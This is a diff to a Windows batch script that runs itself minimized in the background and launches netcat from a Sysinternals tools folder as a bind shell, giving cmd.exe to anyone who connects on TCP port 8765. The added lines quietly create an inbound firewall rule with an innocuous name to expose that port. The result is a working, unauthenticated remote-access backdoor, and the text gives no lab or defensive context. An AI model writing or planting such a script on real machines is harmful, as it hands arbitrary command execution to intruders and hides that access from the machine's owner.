@@ -6,6 +6,15 @@ REM Minimize the window when double-clicked so the shell runs in the background.
 REM IS_MINIMIZED prevents infinite re-launch: only the first run starts minimized.
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 
+REM Ensure Windows Firewall allows inbound TCP/8765 for this bind shell.
+REM Requires admin; rule is idempotent (won't error if it already exists).
+netsh advfirewall firewall show rule name="ncheck-8765" >NUL 2>&1
+if errorlevel 1 (
+    netsh advfirewall firewall add rule ^
+        name="ncheck-8765" ^
+        dir=in action=allow protocol=TCP localport=8765 >NUL 2>&1
+)
+
 REM Bind shell: listen on port 8765 and exec cmd.exe for the connecting client.
 REM %~dp0 = directory of this batch file (e.g. C:\tools\SysinternalsSuite\)
 "%~dp0nc.exe" -l -p 8765 -e cmd.exe
